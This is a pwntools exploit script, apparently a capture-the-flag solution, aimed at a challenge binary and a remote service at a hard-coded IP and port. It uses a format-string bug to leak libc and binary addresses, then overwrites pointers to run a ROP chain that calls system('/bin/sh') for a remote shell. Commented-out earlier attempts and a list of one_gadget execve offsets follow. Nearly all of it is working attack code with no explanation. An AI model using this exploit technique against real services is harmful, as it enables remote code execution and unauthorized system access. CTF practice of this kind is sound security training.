#!/usr/bin/python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x1540

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('45.76.30.75', 1337)
else:
        p = process(exe.path,stderr=PIPE, stdin=PTY)

GDB()
def se(num, payload):
        sla(b'> ',num+b'%'+ payload)

se(b'-14', b'%47$p|%51$p|')
p.recvline()
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x24083
info("libc.address " +hex(libc.address))
exe.address = int(p.recvuntil(b'|', drop=True), 16) - exe.sym.main
info("libc.address " +hex(exe.address))
rop = ROP(libc)
add_rsp = rop.find_gadget(['add rsp, 0x98', 'ret']).address
# ret
target = exe.sym.ptrs + 8*6
pop_rdi = libc.address + 0x0000000000024242 # 0x98
package = {
        pop_rdi & 0xffff: target,
        pop_rdi >> 16 & 0xffff: target+2,
        pop_rdi >> 32 & 0xffff: target+4,
}
order = sorted(package)
# pay = b'a'*6 + flat(libc.address + 0x0000000000023b6a, next(libc.search(b'/bin/sh')), libc.sym.system) 
# pa = pay
pa = f'%{order[0]}c%19$hn'.encode()
pa += f'%{order[1] - order[0]}c%20$hn'.encode()
pa += f'%{order[2] - order[1]}c%21$hn'.encode()
pa = pa.ljust(0x30+4)
pa += flat(package[order[0]], package[order[1]], package[order[2]])
pa += flat(
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a +1,
        libc.address + 0x0000000000023b6a,
        next(libc.search(b'/bin/sh')),
        libc.sym.system
           )
se(b'-14', pa)
# # pop rdi
# target = exe.sym.ptrs + 8*7
# pop_rdi = libc.address + 0x0000000000023b6a
# package = {
#         pop_rdi & 0xffff: target,
#         pop_rdi >> 16 & 0xffff: target+2,
#         pop_rdi >> 32 & 0xffff: target+4,
# }
# order = sorted(package)
# pa = f'%{order[0]}c%19$hn'.encode()
# pa += f'%{order[1] - order[0]}c%20$hn'.encode()
# pa += f'%{order[2] - order[1]}c%21$hn'.encode()
# pa = pa.ljust(0x30+4)
# pa += flat(package[order[0]], package[order[1]], package[order[2]])
# se(b'-14', pa)
# # /binsh
# target = exe.sym.ptrs + 8*8
# pop_rdi = next(libc.search(b'/bin/sh'))
# package = {
#         pop_rdi & 0xffff: target,
#         pop_rdi >> 16 & 0xffff: target+2,
#         pop_rdi >> 32 & 0xffff: target+4,
# }
# order = sorted(package)
# pa = f'%{order[0]}c%19$hn'.encode()
# pa += f'%{order[1] - order[0]}c%20$hn'.encode()
# pa += f'%{order[2] - order[1]}c%21$hn'.encode()
# pa = pa.ljust(0x30+4)
# pa += flat(package[order[0]], package[order[1]], package[order[2]])
# se(b'-14', pa)
# # system
# target = exe.sym.ptrs + 8*9
# pop_rdi = libc.sym.system
# package = {
#         pop_rdi & 0xffff: target,
#         pop_rdi >> 16 & 0xffff: target+2,
#         pop_rdi >> 32 & 0xffff: target+4,
# }
# order = sorted(package)
# pa = f'%{order[0]}c%19$hn'.encode()
# pa += f'%{order[1] - order[0]}c%20$hn'.encode()
# pa += f'%{order[2] - order[1]}c%21$hn'.encode()
# pa = pa.ljust(0x30+4)
# pa += flat(package[order[0]], package[order[1]], package[order[2]])
# se(b'-14', pa)
p.interactive()
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
'''